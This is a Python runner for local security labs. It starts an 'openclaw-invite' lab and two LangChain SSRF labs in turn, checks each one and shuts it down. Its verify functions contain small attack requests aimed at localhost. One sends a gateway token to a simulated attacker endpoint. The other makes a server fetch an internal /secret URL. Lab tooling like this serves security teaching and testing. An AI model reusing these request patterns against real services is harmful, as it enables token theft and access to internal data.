#!/usr/bin/env python3
"""Run all labs sequentially with quick local validation.

This script starts each lab on a distinct base port, performs a minimal
request to confirm behavior, then shuts it down.
"""
import json
import os
import signal
import socket
import subprocess
import tempfile
from pathlib import Path
import time
from dataclasses import dataclass
from urllib.request import Request, urlopen

BASE_PORTS = [9500, 9600, 9700]

@dataclass
class Lab:
    name: str
    path: str
    base_port: int
    verify: callable


def wait_for(url: str, timeout=10.0) -> None:
    start = time.time()
    while time.time() - start < timeout:
        try:
            urlopen(url, timeout=1).read()
            return
        except Exception:
            time.sleep(0.2)
    raise RuntimeError(f"Timeout waiting for {url}")


def ports_available(base_port: int, span: int = 3) -> bool:
    sockets = []
    try:
        for offset in range(span):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("", base_port + offset))
            sockets.append(sock)
        return True
    except OSError:
        return False
    finally:
        for sock in sockets:
            sock.close()


def pick_base_port(preferred: int) -> int:
    if ports_available(preferred):
        return preferred
    for step in range(1, 21):
        candidate = preferred + step * 10
        if ports_available(candidate):
            return candidate
    raise RuntimeError("No available port range found.")


def verify_openclaw(base: int) -> None:
    gateway = base + 1
    attacker = base + 2
    wait_for(f"http://localhost:{gateway}/status")
    payload = json.dumps({"token": "gateway-token-123", "gateway": f"http://localhost:{gateway}"}).encode()
    req = Request(f"http://localhost:{attacker}/connect", method="POST", data=payload, headers={"Content-Type": "application/json"})
    urlopen(req, timeout=2).read()


def verify_ssrf(base: int) -> None:
    control = base
    internal = base + 1
    wait_for(f"http://localhost:{control}/status")
    payload = json.dumps({"url": f"http://localhost:{internal}/secret"}).encode()
    req = Request(f"http://localhost:{control}/fetch", method="POST", data=payload, headers={"Content-Type": "application/json"})
    urlopen(req, timeout=2).read()


def run_lab(lab: Lab) -> None:
    repo_root = Path(__file__).resolve().parent.parent
    lab_path = repo_root / lab.path
    base_port = pick_base_port(lab.base_port)
    env = os.environ.copy()
    env["LAB_PORT_BASE"] = str(base_port)
    log_file = tempfile.NamedTemporaryFile(prefix=f"{lab.name}-", suffix=".log", delete=False)
    proc = subprocess.Popen(
        ["python", str(lab_path)],
        env=env,
        stdout=log_file,
        stderr=subprocess.STDOUT,
        cwd=str(repo_root),
        start_new_session=True,
    )
    try:
        time.sleep(0.5)
        lab.verify(base_port)
        print(f"[ok] {lab.name} (base {base_port})")
    except Exception as exc:
        log_file.flush()
        try:
            with open(log_file.name, "r", encoding="utf-8") as fh:
                tail = fh.read().strip()[-400:]
        except Exception:
            tail = ""
        raise RuntimeError(f"{lab.name} failed: {exc}. Log tail: {tail}") from exc
    finally:
        try:
            os.killpg(proc.pid, signal.SIGTERM)
        except Exception:
            proc.terminate()
        proc.wait(timeout=3)
        log_file.close()
        try:
            os.unlink(log_file.name)
        except Exception:
            pass


def main() -> int:
    labs = [
        Lab("openclaw-invite", "labs/openclaw-invite/run_lab.py", BASE_PORTS[0], verify_openclaw),
        Lab("langchain-ssrf-2024-3095", "labs/langchain-ssrf-2024-3095/run_lab.py", BASE_PORTS[1], verify_ssrf),
        Lab("langchain-ssrf-2025-2828", "labs/langchain-ssrf-2025-2828/run_lab.py", BASE_PORTS[2], verify_ssrf),
    ]

    for lab in labs:
        run_lab(lab)
    print("All labs ran successfully.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
